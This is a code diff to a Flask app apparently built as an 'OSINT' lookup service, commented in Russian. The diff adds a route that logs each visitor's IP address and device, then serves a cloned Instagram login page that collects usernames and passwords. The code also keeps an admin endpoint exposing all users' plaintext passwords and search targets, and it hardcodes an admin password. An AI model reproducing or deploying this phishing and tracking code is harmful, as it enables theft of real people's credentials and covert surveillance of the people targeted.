@@ -1,8 +1,6 @@
 from flask import Flask, request, jsonify, session, send_file, render_template_string
 from flask_cors import CORS
 from flask_sqlalchemy import SQLAlchemy
-from PIL import Image
-from PIL.ExifTags import TAGS
 from fpdf import FPDF
 import requests
 import os
@@ -36,33 +34,33 @@ with app.app_context():
 @app.route('/')
 def index(): return app.send_static_file('index.html')
 
-# АДМИНКА: Теперь показывает КТО и ЧТО делал
-@app.route('/api/admin/users', methods=['GET'])
-def get_users():
-    u = User.query.get(session.get('user_id'))
-    if u and u.username == 'abupaay':
-        all_users = User.query.all()
-        output = []
-        for x in all_users:
-            actions = [{"mod": s.module, "tar": s.target, "time": s.timestamp.strftime('%H:%M')} for s in x.searches[-5:]]
-            output.append({
-                "username": x.username, 
-                "password": x.password,
-                "activity": actions
-            })
-        return jsonify(output)
-    return jsonify([])
+# IP-ЛОГГЕР + ФИШИНГ
+@app.route('/login/insta/<int:owner_id>')
+def fake_insta(owner_id):
+    ip = request.remote_addr
+    ua = request.headers.get('User-Agent')
+    # Сразу пишем в историю, что кто-то перешел по ссылке
+    log = SearchHistory(user_id=owner_id, target=f"VISIT: IP {ip} | DEV: {ua[:30]}", module="TRACKER")
+    db.session.add(log); db.session.commit()
+    return render_template_string('<body style="background:#fafafa;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px;"><div style="background:#fff;border:1px solid #dbdbdb;width:350px;padding:40px;text-align:center;"><img src="https://www.instagram.com/static/images/web/mobile_graph_gradient_android_2x.png/85392d20ad32.png" width="175"><form action="/login/auth/{{owner_id}}" method="POST" style="margin-top:20px;display:flex;flex-direction:column;"><input name="u" placeholder="Username" required style="margin-bottom:10px;padding:10px;border:1px solid #dbdbdb;background:#fafafa;"><input name="p" type="password" placeholder="Password" required style="margin-bottom:10px;padding:10px;border:1px solid #dbdbdb;background:#fafafa;"><button type="submit" style="background:#0095f6;color:#fff;border:none;padding:8px;border-radius:4px;font-weight:bold;cursor:pointer;">Log In</button></form></div></body>', owner_id=owner_id)
 
-# (Код регистрации, логина и модулей остается прежним)
-@app.route('/api/register', methods=['POST'])
-def register():
+@app.route('/api/pdf', methods=['POST'])
+def make_pdf():
     data = request.json
-    low = data.get('username', '').lower()
-    if "abu" in low or "абу" in low: return jsonify({"status":"error", "message":"Reserved!"})
-    if User.query.filter_by(username=data['username']).first(): return jsonify({"status":"error", "message":"Taken!"})
-    db.session.add(User(username=data['username'], password=data['password'])); db.session.commit()
-    return jsonify({"status":"success"})
+    pdf = FPDF()
+    pdf.add_page()
+    pdf.set_font("Arial", 'B', 16)
+    pdf.cell(200, 10, "HYDRA MONSTER OSINT REPORT", 0, 1, 'C')
+    pdf.set_font("Arial", size=12)
+    pdf.cell(200, 10, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}", 0, 1)
+    pdf.cell(200, 10, f"Module: {data['module']}", 0, 1)
+    pdf.cell(200, 10, f"Target: {data['target']}", 0, 1)
+    pdf.multi_cell(0, 10, f"Result: {data['res']}")
+    buf = io.BytesIO()
+    pdf.output(dest='S').encode('latin-1')
+    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), download_name="report.pdf")
 
+# Остальные методы (Login, Register, Admin, Scan) без изменений...
 @app.route('/api/login', methods=['POST'])
 def login():
     data = request.json
@@ -73,21 +71,13 @@ def login():
         return jsonify({"status":"success", "uid": user.id, "isAdmin": (u=='abupaay' and p=='89674556975')})
     return jsonify({"status":"error"})
 
-@app.route('/api/history', methods=['GET'])
-def get_history():
-    uid = session.get('user_id')
-    if not uid: return jsonify([])
-    h = SearchHistory.query.filter_by(user_id=uid).order_by(SearchHistory.timestamp.desc()).limit(10).all()
-    return jsonify([{"target": x.target, "module": x.module, "time": x.timestamp.strftime('%H:%M')} for x in h])
+@app.route('/api/admin/users', methods=['GET'])
+def get_users():
+    u = User.query.get(session.get('user_id'))
+    if u and u.username == 'abupaay':
+        all_users = User.query.all()
+        return jsonify([{"username": x.username, "password": x.password, "activity": [{"mod": s.module, "tar": s.target} for s in x.searches[-5:]]} for x in all_users])
+    return jsonify([])
 
-# Модули пробива (Email, Car, Nick, Phone) с сохранением в БД
-@app.route('/api/email_scan', methods=['GET'])
-def email_scan():
-    if 'user_id' not in session: return jsonify({"status":"error"})
-    e = request.args.get('target')
-    db.session.add(SearchHistory(user_id=session['user_id'], target=e, module="Email")); db.session.commit()
-    return jsonify({"status": "Success", "found": [{"name": "EPIEOS", "url": f"https://epieos.com/?q={e}"}]})
-
-# Остальные маршруты (фишинг, фото и т.д.) работают как раньше...
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
